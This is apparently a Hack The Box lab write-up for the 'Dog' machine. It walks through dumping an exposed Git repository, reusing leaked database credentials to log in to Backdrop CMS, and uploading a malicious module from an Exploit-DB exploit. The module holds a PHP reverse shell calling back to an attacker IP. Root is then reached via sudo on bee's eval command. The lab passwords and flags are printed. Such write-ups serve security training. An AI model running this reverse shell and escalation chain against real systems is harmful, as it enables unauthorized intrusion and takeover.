---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - Git
  - BackdropCMS
  - RemoteCodeExecution
  - RCE
---

![](images/Dog.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Dumping Git Repository](#Dumping-Git-Repository)
    - [Investigating Git Repository](#Investigating-Git-Repository)
- [Backdrop CMS](#Backdrop-CMS)
    - [Password Reuse](#Password-Reuse)
- [Foothold](#Foothold)
    - [Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)](#Backdrop-CMS-1271---Authenticated-Remote-Command-Execution-RCE)
- [Enumeration](#Enumeration)
- [Privilege Escalation to johncusack](#Privilege-Escalation-to-johncusack)
    - [Password Reuse](#Password-Reuse)
- [user.txt](#usertxt)
- [Pivoting](#Pivoting)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
- [root.txt](#roottxt)

## Summary

The box starts with an exposed `Git Repository` which contains `credentials` for the `MySQL Database` and the `username` for the `Backdrop CMS` application called `tiffany`. Through `password reuse` it is possible to login to the `dashboard` of `Backdrop CMS` and install a `malicious plugin` to gain `foothold` on the `box`. On the machine another user with the name `johncusack` can be found. It is possible to `escalate privileges` to him through another `password reuse` which grants access to the `user.txt`. The new user then is allowed to execute `bee.php` using `sudo` which belongs to `Backdrop CMS` and offers the option to execute `PHP code` through `eval`. This can be abuse to execute `arbitrary code` as `root`.

## Reconnaissance

### Port Scanning

As expected the box started with only port `22/TCP` and port `80/TCP` open. Also `Nmap` showed the presence of a `Git Repository`.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.47.82
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-08 20:01 CET
Nmap scan report for 10.129.47.82
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git: 
|   10.129.47.82:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.58 seconds
```

### Enumeration of Port 80/TCP

We started with the `enumeration` of port `80/TCP` and found a website running `Backdrop CMS`.

- [http://10.129.47.82/](http://10.129.47.82/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.129.47.82/
http://10.129.47.82/ [200 OK] Apache[2.4.41], Content-Language[en], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.47.82], UncommonHeaders[x-backdrop-cache,x-generator], X-Frame-Options[SAMEORIGIN]
```

![](images/2025-03-08_20-03_80_website.png)

![](images/2025-03-08_20-04_80_website_backdropcms.png)

![](images/2025-03-08_20-28_80_website_login.png)

### Dumping Git Repository

We used `git-dumper` to download the `Git Repository`. The performance of the box unfortunately was quite bad so we needed a few attempts to receive all files.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Dog/files]
└─$ git-dumper http://dog.htb/ dump                                              
[-] Testing http://dog.htb/.git/HEAD [200]
[-] Testing http://dog.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dog.htb/.git/ [200]
<--- CUT FOR BREVITY --->
```

### Investigating Git Repository

We investigated the `content` to find any `credentials` for the `login page` of `Backdrop CMS`.

```c
┌──(kali㉿kali)-[/media/…/Machines/Dog/files/dump]
└─$ ls -la
total 60
drwxrwx--- 1 root vboxsf   164 Mar  8 20:21 .
drwxrwx--- 1 root vboxsf     8 Mar  8 20:20 ..
drwxrwx--- 1 root vboxsf   222 Mar  8 20:21 core
drwxrwx--- 1 root vboxsf   146 Mar  8 20:21 files
drwxrwx--- 1 root vboxsf   128 Mar  8 20:21 .git
-rwxrwx--- 1 root vboxsf   578 Mar  8 20:21 index.php
drwxrwx--- 1 root vboxsf    18 Mar  8 20:21 layouts
-rwxrwx--- 1 root vboxsf 18092 Mar  8 20:21 LICENSE.txt
-rwxrwx--- 1 root vboxsf  5285 Mar  8 20:21 README.md
-rwxrwx--- 1 root vboxsf  1198 Mar  8 20:21 robots.txt
-rwxrwx--- 1 root vboxsf 21732 Mar  8 20:21 settings.php
drwxrwx--- 1 root vboxsf    36 Mar  8 20:21 sites
drwxrwx--- 1 root vboxsf    18 Mar  8 20:21 themes
```

There was just one `commit` which revealed a potential `username`.

```c
┌──(kali㉿kali)-[/media/…/Machines/Dog/files/dump]
└─$ git log
commit 8204779c764abd4c9d8d95038b6d22b6a7515afa (HEAD -> master)
Author: root <dog@dog.htb>
Date:   Fri Feb 7 21:22:11 2025 +0000

    todo: customize url aliases.  reference:https://docs.backdropcms.org/documentation/url-aliases
```

| Username |
| -------- |
| dog      |

As we took a closer look at the `settings.php` we found `credentials` for the `MySQL Database`.

```c
┌──(kali㉿kali)-[/media/…/Machines/Dog/files/dump]
└─$ head -20 settings.php
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';

/**
 * Site configuration files location.
 *
```

| Username | Password            |
| -------- | ------------------- |
| root     | BackDropJ2024DS2024 |

Within `bootstrap.inc` we found the `version` of `Backdrop CMS`.

```c
┌──(kali㉿kali)-[/media/…/files/dump/core/includes]
└─$ grep -A 2 -B 2 version bootstrap.inc

/**
 * The current system version.
 */
define('BACKDROP_VERSION', '1.27.1');
--

/**
 * Minimum supported version of PHP.
 */
define('BACKDROP_MINIMUM_PHP', '5.6.0');
<--- CUT FOR BREVITY --->
```

And `update.settings.json` contained another `username`.

```c
┌──(kali㉿kali)-[/media/…/Machines/Dog/files/dump]
└─$ grep -A 3 -B 3 -iar dog .
<--- CUT FOR BREVITY --->
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
<--- CUT FOR BREVITY --->
```

| Username |
| -------- |
| tiffany  |

## Backdrop CMS

### Password Reuse

Through `password reuse` we were able to `login` to the `dashboard` of `Backdrop CMS`.

- [http://10.129.47.82/?q=user/login](http://10.129.47.82/?q=user/login)

| Username | Password            |
| -------- | ------------------- |
| tiffany  | BackDropJ2024DS2024 |

![](images/2025-03-08_20-35_80_backdropcms_dashboard.png)

## Foothold

### Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)

Now with working credentials the way to create a `malicious plugin` to achieve `Remote Code Execution (RCE)` as `authenticated user`.

- [https://www.exploit-db.com/exploits/52021](https://www.exploit-db.com/exploits/52021)

However the `Install modules` page indicated that the `Zip PHP extension` was not loaded. That meant we needed to keep that in the back of our heads when it comes to the `malicious plugin`.

![](images/2025-03-08_20-38_80_backdropcms_install_module.png)

Therefore we downloaded the `exploit` from `Exploit-DB` and executed it once to generate the necessary files.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Dog/files]
└─$ ./52021 http://10.129.47.82/?q=admin/dashboard
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.129.47.82/?q=admin/dashboard/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.129.47.82/?q=admin/dashboard/modules/shell/shell.php
```

As next step we `unzipped` the generated `.zip` file and replaced it with a `reverse shell` payload by the amazing `Ivan Sincek`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Dog/files]
└─$ unzip shell.zip
Archive:  shell.zip
replace shell/shell.info? [y]es, [n]o, [A]ll, [N]one, [r]ename: A
 extracting: shell/shell.info        
 extracting: shell/shell.php
```

```c
┌──(kali㉿kali)-[/media/…/Machines/Dog/files/shell]
└─$ wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/refs/heads/master/src/reverse/php_reverse_shell.php   
--2025-03-08 20:41:24--  https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/refs/heads/master/src/reverse/php_reverse_shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9403 (9.2K) [text/plain]
Saving to: ‘php_reverse_shell.php’

php_reverse_shell.php                                      100%[========================================================================================================================================>]   9.18K  --.-KB/s    in 0.002s  

2025-03-08 20:41:24 (3.90 MB/s) - ‘php_reverse_shell.php’ saved [9403/9403]
```

We renamed it to `shell.php` to match the `shell.info` and updated the `IP address` and `port`.

```c
┌──(kali㉿kali)-[/media/…/Machines/Dog/files/shell]
└─$ mv php_reverse_shell.php shell.php
```

```c
┌──(kali㉿kali)-[/media/…/Machines/Dog/files/shell]
└─$ tail -10 shell.php
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.10.14.83', 9001);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

Next instead of trying to upload a `.zip` file we created a `.tar.gz` archive and uploaded that once instead.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Dog/files]
└─$ tar -czvf shell.tar.gz shell/
shell/
shell/shell.info
shell/shell.php
```

![](images/2025-03-08_20-43_80_backdropcms_upload_module.png)

It worked as expected and after we triggered the `reverse shell payload` by accessing the following `URL` we received a `callback`.

![](images/2025-03-08_20-45_80_backdropcms_install_successful.png)

- [http://10.129.47.82/modules/shell/shell.php](http://10.129.47.82/modules/shell/shell.php)

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.83] from (UNKNOWN) [10.129.47.82] 57288
SOCKET: Shell has connected! PID: 1776
python3 -c 'import pty;pty.spawn("/usr/bin/bash")'
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@dog:/var/www/html/modules/shell$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9001

www-data@dog:/var/www/html/modules/shell$ 
www-data@dog:/var/www/html/modules/shell$ export xterm=XTERM
www-data@dog:/var/www/html/modules/shell$
```

## Enumeration

Through a quick `enumeration` we found another user called `johncusack`.

```c
www-data@dog:/var/www/html/modules/shell$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```c
www-data@dog:/var/www/html/modules/shell$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

| Username   |
| ---------- |
| jobert     |
| johncusack |

## Privilege Escalation to johncusack

### Password Reuse

Another `password reuse` allowed us to switch the session directly to `johncusack` and therefore we were able to use `SSH` to gain a proper shell.

```c
www-data@dog:/var/www/html/modules/shell$ su johncusack
Password: 
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
sh: 0: getcwd() failed: No such file or directory
johncusack@dog:/var/www/html/modules/shell$
```

```c
┌──(kali㉿kali)-[~]
└─$ ssh johncusack@10.129.47.82
The authenticity of host '10.129.47.82 (10.129.47.82)' can't be established.
ED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:121: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.47.82' (ED25519) to the list of known hosts.
johncusack@10.129.47.82's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 08 Mar 2025 07:53:20 PM UTC

  System load:           0.93
  Usage of /:            49.3% of 6.32GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             235
  Users logged in:       0
  IPv4 address for eth0: 10.129.47.82
  IPv6 address for eth0: dead:beef::250:56ff:fe94:dde5


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


johncusack@dog:~$
```

## user.txt

We grabbed the `user.txt` and moved on.

```c
johncusack@dog:~$ cat user.txt
344d6bdda332800279c18fdebc2ad44e
```

## Pivoting

The `pivoting` of `johncusack` showed that he was allowed to execute `/usr/local/bin/bee` using `sudo` which was a `Symbolic Link` to `/backdrop_tool/bee/bee.php` which belong to `Backdrop CMS`.

```c
johncusack@dog:~$ id
uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)
```

```c
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

```c
johncusack@dog:~$ file /usr/local/bin/bee
/usr/local/bin/bee: symbolic link to /backdrop_tool/bee/bee.php
```

```c
johncusack@dog:~$ cat /usr/local/bin/bee
#!/usr/bin/env php
<?php
/**
 * @file
 * A command line utility for Backdrop CMS.
 */

// Exit gracefully with a meaningful message if installed within a web
// accessible location and accessed in the browser.
if (!bee_is_cli()) {
  echo bee_browser_load_html();
  die();
}

// Set custom error handler.
set_error_handler('bee_error_handler');

// Include files.
require_once __DIR__ . '/includes/miscellaneous.inc';
require_once __DIR__ . '/includes/command.inc';
require_once __DIR__ . '/includes/render.inc';
require_once __DIR__ . '/includes/filesystem.inc';
require_once __DIR__ . '/includes/input.inc';
require_once __DIR__ . '/includes/globals.inc';

// Main execution code.
bee_initialize_server();
bee_parse_input();
bee_initialize_console();
bee_process_command();
bee_print_messages();
bee_display_output();
exit();

/**
 * Custom error handler for `bee`.
 *
 * @param int $error_level
 *   The level of the error.
 * @param string $message
 *   Error message to output to the user.
 * @param string $filename
 *   The file that the error came from.
 * @param int $line
 *   The line number the error came from.
 * @param array $context
 *   An array of all variables from where the error was triggered.
 *
 * @see https://www.php.net/manual/en/function.set-error-handler.php
 * @see _backdrop_error_handler()
 */
function bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) {
  require_once __DIR__ . '/includes/errors.inc';
  _bee_error_handler_real($error_level, $message, $filename, $line, $context);
}

/**
 * Detects whether the current script is running in a command-line environment.
 */
function bee_is_cli() {
  return (empty($_SERVER['SERVER_SOFTWARE']) && (php_sapi_name() == 'cli' || (is_numeric($_SERVER['argc']) && $_SERVER['argc'] > 0)));
}

/**
 * Return the HTML to display if this page is loaded in the browser.
 *
 * @return string
 *   The concatentated html to display.
 */
function bee_browser_load_html() {
  // Set the title to use in h1 and title elements.
  $title = "Bee Gone!";
  // Place a white block over "#!/usr/bin/env php" as this is output before
  // anything else.
  $browser_output = "<div style='background-color:white;position:absolute;width:15rem;height:3rem;top:0;left:0;z-index:9;'>&nbsp;</div>";
  // Add the bee logo and style appropriately.
  $browser_output .= "<img src='./images/bee.png' align='right' width='150' height='157' style='max-width:100%;margin-top:3rem;'>";
  // Add meaningful text.
  $browser_output .= "<h1 style='font-family:Tahoma;'>$title</h1>";
  $browser_output .= "<p style='font-family:Verdana;'>Bee is a command line tool only and will not work in the browser.</p>";
  // Add the document title using javascript when the window loads.
  $browser_output .= "<script>window.onload = function(){document.title='$title';}</script>";
  // Output the combined string.
  return $browser_output;
}
```

## Privilege Escalation to root

The `script` provided a lot of options and the most interesting to us was the execution of `PHP code` through `eval`. We pointed it to the `root directory` for the `bootstrap` and spawned a new shell as `root`.

```c
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval 'system("/usr/bin/bash");'
root@dog:/var/www/html#
```

## root.txt

```c
root@dog:~# cat root.txt 
c460c7867074d890578e27646e506095
```
